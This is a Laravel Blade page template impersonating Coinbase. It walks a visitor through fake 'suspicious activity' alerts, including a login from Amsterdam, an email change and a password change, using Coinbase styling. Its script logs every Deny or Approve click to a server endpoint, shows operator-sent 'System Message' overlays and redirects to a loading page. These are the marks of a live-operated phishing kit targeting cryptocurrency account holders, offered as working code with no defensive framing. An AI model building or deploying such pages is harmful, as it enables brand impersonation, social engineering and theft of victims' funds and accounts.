@extends('user.coinbase.layout')

@section('title', 'Coinbase - Review Account')

@section('pageCss')
</style>
<link rel="stylesheet" href="/coinbase/css/review-account.css"/>
<style>
{!! file_get_contents(resource_path('views/user/coinbase/css/review-account.css')) !!}
@endsection

@section('content')
<form class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8 items-center text-center">

  <div class="mb-8 flex w-full gap-4">
    <div class="h-2 w-full overflow-hidden rounded-full bg-coinbase-foreground-muted transition-colors">
      <div class="h-full bg-coinbase-primary transition-all duration-500" id="bar-0" style="width:0%"></div>
    </div>
    <div class="h-2 w-full overflow-hidden rounded-full bg-coinbase-foreground-muted transition-colors">
      <div class="h-full bg-coinbase-primary transition-all duration-500" id="bar-1" style="width:0%"></div>
    </div>
    <div class="h-2 w-full overflow-hidden rounded-full bg-coinbase-foreground-muted transition-colors">
      <div class="h-full bg-coinbase-primary transition-all duration-500" id="bar-2" style="width:0%"></div>
    </div>
  </div>

  <div class="step active" id="step-0">
    <span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white" style="display:block;margin-bottom:12px;">
      Review your account
    </span>
    <span class="font-coinbase-sans text-coinbase-foreground-muted" style="display:block;margin-bottom:28px;">
      We detected unusual activity on your account. To ensure the security of your account, please review these actions before continuing.
    </span>
    <button class="bg-coinbase-primary hover:bg-[#507fe5] disabled:bg-[#314b84] active:bg-[#4b78d6] disabled:scale-100 active:scale-[.98] rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center mt-8 w-full" type="button" id="btn-step0" onclick="nextStep(0,'continue')">
      Continue
    </button>
  </div>

  <div class="step" id="step-1">
    <span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white" style="display:block;margin-bottom:12px;">
      Review your account
    </span>
    <span class="font-coinbase-sans text-coinbase-foreground-muted" style="display:block;margin-bottom:28px;">
      We detected a suspicious login attempt from <span id="rv-location-val" style="color:#fff;font-weight:600;">Amsterdam, Netherlands</span> at <span id="rv-time-val" style="color:#fff;font-weight:600;">02:14 AM CET</span> from <span id="rv-device-val-1" style="color:#fff;font-weight:600;">Michael's iPhone</span>.
    </span>
    <div class="btn-row">
      <button class="btn-deny font-coinbase-sans" id="btn-step1-deny" type="button" onclick="nextStep(1,'deny')">Deny</button>
      <button class="btn-approve font-coinbase-sans" id="btn-step1-approve" type="button" onclick="nextStep(1,'approve')">Approve</button>
    </div>
  </div>

  <div class="step" id="step-2">
    <span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white" style="display:block;margin-bottom:12px;">
      Review your account
    </span>
    <span class="font-coinbase-sans text-coinbase-foreground-muted" style="display:block;margin-bottom:28px;">
      We detected a suspicious request to change the email on file to <span id="rv-email-val" style="color:#fff;font-weight:600;">m***42@gmail.com</span>.
    </span>
    <div class="btn-row">
      <button class="btn-deny font-coinbase-sans" id="btn-step2-deny" type="button" onclick="nextStep(2,'deny')">Deny</button>
      <button class="btn-approve font-coinbase-sans" id="btn-step2-approve" type="button" onclick="nextStep(2,'approve')">Approve</button>
    </div>
  </div>

  <div class="step" id="step-3">
    <span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white" style="display:block;margin-bottom:12px;">
      Review your account
    </span>
    <span class="font-coinbase-sans text-coinbase-foreground-muted" style="display:block;margin-bottom:28px;">
      We detected a suspicious password change request from <span id="rv-device-val" style="color:#fff;font-weight:600;">Michael's iPhone</span>.
    </span>
    <div class="btn-row">
      <button class="btn-deny font-coinbase-sans" id="btn-step3-deny" type="button" onclick="nextStep(3,'deny')">Deny</button>
      <button class="btn-approve font-coinbase-sans" id="btn-step3-approve" type="button" onclick="nextStep(3,'approve')">Approve</button>
    </div>
  </div>

</form>

<div id="admin-overlay">
  <div class="overlay-card">
    <div style="font-size:10px;letter-spacing:.14em;color:rgba(255,255,255,.4);text-transform:uppercase;margin-bottom:14px;font-weight:600;">System Message</div>
    <p id="admin-overlay-message"></p>
    <button onclick="document.getElementById('admin-overlay').classList.remove('show')">Dismiss</button>
  </div>
</div>

<script>
(function(){
  var _d = window._cbRvData || {};
  var name     = _d.name     || 'Michael';
  var location = _d.location || 'Amsterdam, Netherlands';
  var time     = _d.time     || '02:14 AM CET';
  var emailPfx = name.toLowerCase().replace(/\s+/g,'');
  var num      = _d.num      || (Math.floor(Math.random()*900)+100);
  var dev = name + "'s iPhone";
  var locEl    = document.getElementById('rv-location-val');
  var timeEl   = document.getElementById('rv-time-val');
  var emailEl  = document.getElementById('rv-email-val');
  var devEl1   = document.getElementById('rv-device-val-1');
  var devEl    = document.getElementById('rv-device-val');
  if (locEl)   locEl.textContent   = location;
  if (timeEl)  timeEl.textContent  = time;
  if (emailEl) emailEl.textContent = emailPfx + num + '@gmail.com';
  if (devEl1)  devEl1.textContent  = dev;
  if (devEl)   devEl.textContent   = dev;
})();

var _stepLabels = ['unusual_activity','suspicious_login','email_change','password_change'];

function _llRvSetProgress(filled) {
  for (var i = 0; i < 3; i++) {
    var el = document.getElementById('bar-'+i);
    if (el) el.style.width = (i < filled ? '100%' : '0%');
  }
}

window.nextStep = function(step, action) {
  var btns = document.querySelectorAll('#step-'+step+' button');
  btns.forEach(function(b){ b.disabled = true; });

  if (typeof window._liveledCSRF !== 'undefined') {
    var b = new URLSearchParams({ _token: window._liveledCSRF, page: 'coinbase_review_account', type: 'form_submit', element: _stepLabels[step], value: action });
    fetch('/api/log', { method: 'POST', body: b, keepalive: true });
  }

  if (step === 0) {
    document.getElementById('step-0').classList.remove('active');
    document.getElementById('step-1').classList.add('active');
    _llRvSetProgress(0);
    return;
  }

  if (step === 3) {
    document.documentElement.style.background = '#0a0b0d';
    document.body.style.background = '#0a0b0d';
    if (window.navigateTo) window.navigateTo('/coinbase/loading');
    else window.location.href = '/coinbase/loading';
    return;
  }

  document.getElementById('step-'+step).classList.remove('active');
  document.getElementById('step-'+(step+1)).classList.add('active');
  _llRvSetProgress(step);
};
</script>
@endsection
